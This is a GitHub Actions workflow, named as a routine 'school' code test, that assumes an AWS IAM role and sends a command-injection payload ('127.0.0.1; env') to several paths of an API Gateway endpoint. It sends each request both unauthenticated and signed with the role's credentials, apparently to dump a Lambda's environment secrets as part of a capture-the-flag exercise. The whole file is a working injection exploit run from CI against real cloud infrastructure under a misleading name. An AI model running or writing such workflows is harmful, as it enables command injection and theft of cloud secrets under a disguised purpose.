name: AWS OIDC test for school standart old code procedure

on:
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Invoke Vulnerable Lambda
        run: |
          API_ID="3q931syi7b"
          REGION="us-east-1"
          BASE_URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev"
          PAYLOAD='{"domain": "127.0.0.1; env"}'
          
          # The most common paths for a lookup tool CTF
          TARGET_PATHS=("/nslookup" "/" "/lookup" "/query")

          for PATH_NAME in "${TARGET_PATHS[@]}"; do
            URL="${BASE_URL}${PATH_NAME}"
            echo "-----------------------------------"
            echo "Testing Target: $URL"
            
            # 1. Try Unauthenticated POST
            RES=$(curl -s -X POST "$URL" \
              -H "Content-Type: application/json" \
              -d "$PAYLOAD")
            echo "Unauthenticated Response: $RES"
            
            # 2. Try IAM SigV4 Signed POST (using your cicdRole credentials)
            SIGNED_RES=$(curl -s -X POST "$URL" \
              --aws-sigv4 "aws:amz:${REGION}:execute-api" \
              --user "${AWS_ACCESS_KEY_ID}:${AWS_SECRET_ACCESS_KEY}" \
              -H "x-amz-security-token: ${AWS_SESSION_TOKEN}" \
              -H "Content-Type: application/json" \
              -d "$PAYLOAD")
            echo "Signed Response: $SIGNED_RES"
          done
